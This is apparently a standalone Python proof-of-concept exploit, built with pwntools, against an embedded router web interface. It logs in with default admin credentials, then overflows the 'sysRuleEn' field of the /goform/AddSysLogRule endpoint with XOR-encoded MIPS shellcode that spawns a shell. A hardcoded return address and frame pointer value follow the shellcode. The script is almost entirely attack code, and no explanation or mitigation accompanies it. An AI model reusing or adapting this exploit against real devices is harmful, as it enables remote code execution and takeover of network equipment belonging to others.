import requests
from datetime import datetime
from pwn import *
context(log_level='debug', arch='mips')
session = requests.Session()

IP = '127.0.0.1'
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Origin': f'http://{IP}',
    'Connection': 'keep-alive',
    'Referer': f'http://{IP}/login.asp',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Priority': 'u=0, i'
})

session.cookies.set('i21_user', 'admin', domain=f'{IP}')

now = datetime.now()
current_time_str = f"{now.year};{now.month};{now.day};{now.hour};{now.minute};{now.second}"

data = {
    'usertype': 'user',
    'password': 'YWRtaW4=', 
    'time': current_time_str,
    'username': 'admin'
}

url = f'http://{IP}/login/Auth'
response = session.post(url, data=data)

print(f"Status Code: {response.status_code}")

session.headers.update({
    "Content-Type": "application/x-www-form-urlencoded"
})
cookies = {
    "password": "1111"
}

shellcode = asm(shellcraft.sh())
avoid = b'\x00'
encoded = pwnlib.encoders.mips.xor.encode(shellcode, avoid)

retaddr = 0x2b2aa894
original_fp_val = 0x5033e8
data = {
    "op": "modify",
    "sysRuleEn": b'a'*2 + encoded.ljust(0x100,b'a')+p32(retaddr)+p32(original_fp_val)
}

try:
    response = session.post(
        f'http://{IP}/goform/AddSysLogRule',  
        cookies=cookies, 
        data=data, 
        timeout=5
    )
    
    print(f"Status Code: {response.status_code}")
    print("\n--- Response Text ---")
    print(response.text)

except requests.exceptions.RequestException as e:
    print(f"Request failed: {e}")